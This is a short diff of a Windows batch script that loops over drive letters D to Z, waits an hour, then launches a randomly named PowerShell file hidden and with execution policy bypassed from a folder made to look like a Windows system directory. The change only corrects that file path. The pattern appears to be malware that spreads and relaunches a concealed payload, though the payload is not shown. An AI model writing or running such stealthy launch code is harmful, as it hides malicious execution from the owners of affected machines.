@@ -41,7 +41,7 @@ for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
 )
 
 timeout /t 3600 /nobreak >nul
-powershell powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File "C:/Users/%USERNAME%/Program Data/Microsoft/Windows/AEQKCPrkuifY.ps1"
+powershell powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File "C:/ProgramData/Microsoft/Windows/AEQKCPrkuifY.ps1"
 
 @end
 exit
